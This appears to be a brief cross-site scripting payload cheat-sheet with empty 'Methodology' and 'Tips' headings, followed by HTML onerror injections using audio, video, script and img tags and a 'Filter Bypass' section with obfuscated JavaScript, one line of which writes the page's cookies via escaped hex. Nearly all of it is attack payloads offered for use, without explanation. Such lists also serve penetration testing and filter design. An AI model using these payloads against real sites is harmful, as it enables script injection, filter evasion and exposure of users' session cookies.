
### 1.Methodology


### 2.Tips!


### 3.Payloads
```
<audio src=x onerror=alert(0)>
<video src=x onerror=alert(0)>
<script src=x onerror=alert(0)>
<img src=x onerror=alert`1`>
<img src=x onerror=confirm`1`>
```

#### 3.1 Filter Bypass
```
[1].map(alert)
(alert)(1)
javascript:setTimeout`\x64ocument.write\x28\x64ocument.\x63ookie\x29`
```
